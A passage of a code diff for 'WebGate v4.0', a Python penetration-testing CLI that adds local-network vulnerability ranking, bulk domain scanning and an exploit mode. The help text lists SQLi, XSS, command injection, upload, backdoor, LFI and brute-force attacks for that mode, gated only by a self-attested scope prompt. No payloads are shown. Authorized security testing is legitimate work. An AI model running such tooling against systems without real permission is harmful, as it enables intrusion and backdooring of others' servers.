+                print(f"\n  {C.RED}[!]{C.RST} {len(likely)} CVE(s) LIKELY exploitable:")
+                for v in likely:
+                    print(f"      {C.RED}{v['cve_id']}{C.RST} on port {v['port']} ({v['service']})")
+        else:
+            print(f"  {C.GRY}No open ports found{C.RST}")
+        print()
+
+    def agent_mode(self):
+        """Network agent: scan local network, find most vulnerable host."""
+        print(f"\n  {C.WHT}[*]{C.RST} {C.BOLD}AGENT MODE — Network Assessment{C.RST}")
+        print(f"  {C.GRY}{'─' * 56}{C.RST}")
+        self._last_prog = -1
+        agent = NetworkAgent(log_cb=self.log_cb, prog_cb=self.prog_cb)
+        result = agent.run()
+
+        most_vuln = result.get("most_vulnerable")
+        if most_vuln and most_vuln["score"] > 0:
+            print(f"\n  {C.YLW}[?]{C.RST} Deep scan the most vulnerable host ({most_vuln['ip']})? [y/N] ", end="")
+            try:
+                ans = input().strip().lower()
+                if ans in ("y", "yes"):
+                    self.quick(most_vuln["ip"], deep=True)
+            except:
+                pass
+        print()
+
+    def exploit_mode(self, domain: str):
+        """Exploit mode — requires scope agreement."""
+        print(f"\n{C.RED}{SCOPE_AGREEMENT_TEXT}{C.RST}")
+        print(f"  {C.YLW}Do you have a signed Scope Agreement for {domain}? [Y/n]{C.RST} ", end="")
+        try:
+            ans = input().strip()
+        except (KeyboardInterrupt, EOFError):
+            print(f"\n  {C.GRY}Cancelled.{C.RST}"); return
+
+        if ans.upper() != "Y":
+            print(f"  {C.RED}Exploit mode requires agreement. Cancelled.{C.RST}\n")
+            return
+
+        self._scope_agreed = True
+        print(f"\n  {C.GRN}[✓]{C.RST} Scope Agreement accepted.")
+        print(f"  {C.WHT}[*]{C.RST} Starting exploit session against: {C.BOLD}{domain}{C.RST}")
+        print(f"  {C.GRY}{'─' * 56}{C.RST}")
+        self._last_prog = -1
+
+        ef = ExploitFramework(domain, log_cb=self.log_cb, prog_cb=self.prog_cb)
+        ef.run()
+        print(f"\n  {C.GRN}[✓]{C.RST} Exploit session complete\n")
+
+    def enum_subdomains(self, domain: str):
+        """Standalone subdomain enumeration."""
+        print(f"\n  {C.WHT}[*]{C.RST} Subdomain Enumeration: {C.BOLD}{domain}{C.RST}")
+        print(f"  {C.GRY}{'─' * 56}{C.RST}")
+        sc = DomainScanner(domain, log_cb=self.log_cb, prog_cb=self.prog_cb)
+        sc.enumerate_subdomains()
+        subs = sc.results.get("subdomains", [])
+        if subs:
+            print(f"\n  {C.GRN}[✓]{C.RST} Found {len(subs)} subdomains\n")
+        else:
+            print(f"\n  {C.GRY}No subdomains found{C.RST}\n")
+
+    def bulk_scan(self, filepath: str):
+        """Scan multiple targets from a file (one domain per line)."""
+        if not os.path.isfile(filepath):
+            print(f"  {C.RED}File not found: {filepath}{C.RST}")
+            return
+        with open(filepath) as f:
+            targets = [line.strip() for line in f if line.strip() and not line.startswith("#")]
+        if not targets:
+            print(f"  {C.RED}No targets in file{C.RST}")
+            return
+
+        print(f"\n  {C.WHT}[*]{C.RST} {C.BOLD}BULK SCAN{C.RST} — {len(targets)} targets from {filepath}")
+        print(f"  {C.GRY}{'─' * 56}{C.RST}")
+
+        results_summary = []
+        for i, target in enumerate(targets):
+            print(f"\n  {C.CYN}[{i+1}/{len(targets)}]{C.RST} {target}")
+            print(f"  {C.GRY}{'─' * 40}{C.RST}")
+            self._last_prog = -1
+            sc = DomainScanner(target, log_cb=self.log_cb, prog_cb=self.prog_cb)
+            report = sc.run()
+            open_ports = len(sc.results.get("ports", {}).get("open", []))
+            risks = sc._build_risks()
+            crit = sum(1 for s, _ in risks if s == "CRITICAL")
+            results_summary.append({
+                "target": target, "open_ports": open_ports,
+                "risks": len(risks), "critical": crit, "report": report
+            })
+
+        # Print summary table
+        print(f"\n  {C.WHT}{'═' * 56}{C.RST}")
+        print(f"  {C.WHT}BULK SCAN SUMMARY{C.RST}")
+        print(f"  {C.WHT}{'═' * 56}{C.RST}")
+        for r in sorted(results_summary, key=lambda x: x["critical"], reverse=True):
+            risk_color = C.RED if r["critical"] > 0 else (C.YLW if r["risks"] > 2 else C.GRN)
+            print(f"  {risk_color}{'●'}{C.RST} {r['target']:<28} "
+                  f"Ports:{r['open_ports']:<3} Risks:{r['risks']:<3} Crit:{r['critical']}")
+        print()
+
+    def full_scan(self, domain: str):
+        """Full scan: surface + fingerprint + CVE verify + deep."""
+        print(f"\n  {C.WHT}[*]{C.RST} {C.BOLD}FULL SCAN{C.RST}: {domain}")
+        print(f"  {C.GRY}{'─' * 56}{C.RST}")
+        self._last_prog = -1
+
+        # 1) Surface scan
+        self.log_cb("Phase 1: Surface scan", "STEP")
+        sc = DomainScanner(domain, log_cb=self.log_cb, prog_cb=self.prog_cb)
+        report = sc.run()
+
+        # 2) Fingerprint
+        self.log_cb("Phase 2: Fingerprinting", "STEP")
+        fp = ServiceFingerprinter(domain, log_cb=self.log_cb)
+        fp.fingerprint()
+
+        # 3) CVE verification
+        open_ports = sc.results.get("ports", {}).get("open", [])
+        if open_ports:
+            self.log_cb("Phase 3: CVE verification", "STEP")
+            cv = CVEVerifier(domain, open_ports, log_cb=self.log_cb)
+            cv.verify_all()
+
+        # 4) Deep scan
+        self.log_cb("Phase 4: Deep scan", "STEP")
+        ds = DeepScanner(domain, log_cb=self.log_cb, prog_cb=self.prog_cb)
+        ds.run()
+
+        if report:
+            print(f"\n  {C.GRN}[✓]{C.RST} Full scan complete. Report: {report}\n")
+
+    def _show_tools(self):
+        """Show installed/missing tools."""
+        print(f"\n  {C.WHT}Tool Status:{C.RST}")
+        for key, info in TOOL_CATALOG.items():
+            if info["ext"]:
+                cmd = info["cmd"]
+                try:
+                    installed = subprocess.run(["which", cmd], capture_output=True).returncode == 0
+                except:
+                    installed = False
+                status = f"{C.GRN}✓{C.RST}" if installed else f"{C.RED}✗{C.RST}"
+                print(f"    {status} {info['label']:<24} ({cmd})")
+        print()
+
+    def _show_settings(self):
+        """Show current settings."""
+        print(f"\n  {C.WHT}Current Settings:{C.RST}")
+        for k, v in SETTINGS.items():
+            if k != "deep_tools":
+                print(f"    {k:<16}: {v}")
+        print()
+
+    def _export_info(self):
+        """Export system info for debugging."""
+        print(f"\n  {C.WHT}System Info:{C.RST}")
+        print(f"    Platform   : {sys.platform}")
+        print(f"    Python     : {sys.version.split()[0]}")
+        print(f"    DNS module : {'yes' if DNS_OK else 'no'}")
+        print(f"    WHOIS      : {'yes' if WHOIS_OK else 'no'}")
+        print(f"    Requests   : {'yes' if REQUESTS_OK else 'no'}")
+        print(f"    Netifaces  : {'yes' if NETIFACES_OK else 'no'}")
+        print(f"    Paramiko   : {'yes' if PARAMIKO_OK else 'no'}")
+        print(f"    CVE DB     : {get_all_cve_count()} entries")
+
+        # Check Termux
+        is_termux = os.environ.get("TERMUX_VERSION") or os.path.isdir("/data/data/com.termux")
+        print(f"    Termux     : {'yes' if is_termux else 'no'}")
+        print()
+
     def _help(self):
         print(f"""
-  {C.WHT}Commands:{C.RST}
-  {C.GRY}<domain>         {C.RST}Run surface scan
-  {C.GRY}deep <domain>    {C.RST}Run surface + deep scan
-  {C.GRY}help             {C.RST}Show this help
-  {C.GRY}exit / quit      {C.RST}Exit WebGate
-  {C.GRY}python webgate.py --gui   {C.RST}Launch GUI
+  {C.WHT}{'─' * 56}{C.RST}
+  {C.WHT}WebGate v4.0 — Commands{C.RST}
+  {C.WHT}{'─' * 56}{C.RST}
+
+  {C.CYN}Scanning:{C.RST}
+  {C.GRY}<domain>              {C.RST}Surface scan + fingerprint + CVE verify
+  {C.GRY}deep <domain>         {C.RST}Surface + deep scan (30+ tools)
+  {C.GRY}full <domain>         {C.RST}Complete: surface + finger + CVE + deep
+  {C.GRY}finger <domain>       {C.RST}Device/OS/CMS fingerprinting only
+  {C.GRY}verify <domain>       {C.RST}CVE verification on open ports
+
+  {C.CYN}Network:{C.RST}
+  {C.GRY}agent                 {C.RST}Scan local network, find most vulnerable
+  {C.GRY}subs <domain>         {C.RST}Subdomain enumeration (80+ prefixes)
+  {C.GRY}bulk <file.txt>       {C.RST}Scan targets from file (one per line)
+
+  {C.CYN}Exploit (Scope Agreement required):{C.RST}
+  {C.GRY}exploit <domain>      {C.RST}SQLi, XSS, CMDi, upload, backdoor, LFI, brute
+
+  {C.CYN}Config:{C.RST}
+  {C.GRY}proxy <url|off>       {C.RST}Set/disable HTTP proxy (http://host:port)
+  {C.GRY}tools                 {C.RST}Show installed/missing tools
+  {C.GRY}settings              {C.RST}Show current settings
+  {C.GRY}export                {C.RST}Export system info
+  {C.GRY}version               {C.RST}Show version
+  {C.GRY}gui                   {C.RST}Launch GUI (desktop only)
+  {C.GRY}help                  {C.RST}This help
+  {C.GRY}exit                  {C.RST}Exit WebGate
 """)
 
 
@@ -3589,12 +5746,11 @@ def _ensure_git_repo():
 def main():
     _init_sound()
     init_cve_db()
-    _ensure_git_repo()
 
-    if _IS_SYMLINK and sys.stdout.isatty():
+    if sys.stdout.isatty():
         Y = '\033[33m'; RST = '\033[0m'
         print(f"\n  {Y}{'─'*62}{RST}")
-        print(f"  {Y}[!] WebGate — for AUTHORIZED security testing only.{RST}")
+        print(f"  {Y}[!] WebGate v4.0 — for AUTHORIZED security testing only.{RST}")
         print(f"  {Y}     Only scan systems you own or have written permission to test.{RST}")
         print(f"  {Y}{'─'*62}{RST}\n")
 
@@ -3602,22 +5758,59 @@ def main():
     p.add_argument("-d", "--domain", default="")
     p.add_argument("--gui",      action="store_true")
     p.add_argument("--no-color", action="store_true")
+    p.add_argument("--init-db",  action="store_true")
     p.add_argument("-h", "--help", action="store_true")
+    p.add_argument("command", nargs="?", default="")
+    p.add_argument("target", nargs="?", default="")
     args = p.parse_args()
 
     if args.no_color: C.disable()
+    if args.init_db:
+        init_cve_db()
+        print(f"CVE database initialized: {get_all_cve_count()} entries")
+        return
     if args.help:
         print(BANNER)
-        print("  python webgate.py              →  interactive CLI")
-        print("  python webgate.py --gui        →  GUI interface")
-        print("  python webgate.py -d domain    →  quick CLI scan")
-        print("  python webgate.py --gui -d dom →  GUI with prefill")
+        print("  python webgate.py                    →  interactive CLI shell")
+        print("  python webgate.py -d domain          →  quick surface scan")
+        print("  python webgate.py deep domain        →  surface + deep scan")
+        print("  python webgate.py full domain        →  complete scan (all phases)")
+        print("  python webgate.py agent              →  scan local network")
+        print("  python webgate.py exploit domain     →  exploit mode (scope required)")
+        print("  python webgate.py finger domain      →  fingerprint device/OS/CMS")
+        print("  python webgate.py verify domain      →  verify CVEs on open ports")
+        print("  python webgate.py --gui              →  launch GUI (desktop)")
+        print("  python webgate.py --gui -d domain    →  GUI with prefill")
+        print()
         return
     if args.gui:
         launch_gui(domain=args.domain); return
+
     cli = CLIInterface()
-    if args.domain:
+
+    # Handle direct commands
+    cmd = args.command.lower() if args.command else ""
+    target = args.target or args.domain
+
+    if cmd == "agent":
+        cli.agent_mode()
+    elif cmd == "exploit" and target:
+        cli.exploit_mode(target)
+    elif cmd == "deep" and target:
+        cli.quick(target, deep=True)
+    elif cmd == "full" and target:
+        cli.full_scan(target)
+    elif cmd == "finger" and target:
+        cli.fingerprint(target)
+    elif cmd == "verify" and target:
+        cli.verify_cve(target)
+    elif cmd == "tools":
+        cli._show_tools()
+    elif args.domain:
         cli.quick(args.domain)
+    elif cmd and cmd not in ("", "agent"):
+        # Treat command as domain if it looks like one
+        cli.quick(cmd)
     else:
         cli.shell()
 
